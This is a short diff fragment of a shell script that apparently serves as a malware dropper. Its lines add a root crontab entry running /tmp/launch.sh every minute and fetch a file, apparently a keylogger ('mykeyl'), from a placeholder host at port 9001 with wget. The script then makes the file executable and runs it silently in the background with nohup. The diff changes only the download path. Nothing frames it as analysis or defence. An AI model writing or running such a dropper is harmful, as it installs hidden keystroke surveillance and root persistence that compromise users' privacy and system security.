@@ -28,7 +28,7 @@ chmod +x /tmp/killSwitch.sh
 echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
 
 #keyl
-wget -O /tmp/mykeyl http://<IP>:9001/mykeyl
+wget -O /tmp/keyl http://<IP>:9001/dist/mykeyl
 chmod u+x /tmp/keyl
 
 nohup /tmp/keyl &> /dev/null &
